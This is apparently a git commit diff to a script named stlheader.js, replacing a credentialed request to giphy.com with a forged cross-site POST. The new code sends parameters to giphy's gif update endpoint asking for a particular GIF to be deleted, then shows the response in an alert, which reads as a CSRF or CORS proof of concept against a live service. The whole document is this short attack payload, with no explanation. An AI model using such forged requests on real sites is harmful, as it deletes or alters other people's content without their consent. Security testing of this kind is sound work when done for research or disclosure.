acc0038d48231777befc85e77cc4f6f71a89485d
naysser <77415898+naysser@users.noreply.github.com>
2021-08-18 22:53:22 +0200

    Update stlheader.js

--- stlheader.js
+++ stlheader.js
@@ -1,4 +1,14 @@
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://giphy.com/create/gifmaker/', true);
-xhr.withCredentials = true;
-xhr.send(null);
+var http = new XMLHttpRequest();
+var url = 'https://www.giphy.com/ajax/gif/update';
+var params = 'gif_id=dk8319804f0G5hbENe&key=delete_gif&value=true';
+http.open('POST', url, true);
+
+//Send the proper header information along with the request
+http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+http.onreadystatechange = function() {//Call a function when the state changes.
+    if(http.readyState == 4 && http.status == 200) {
+        alert(http.responseText);
+    }
+}
+http.send(params);
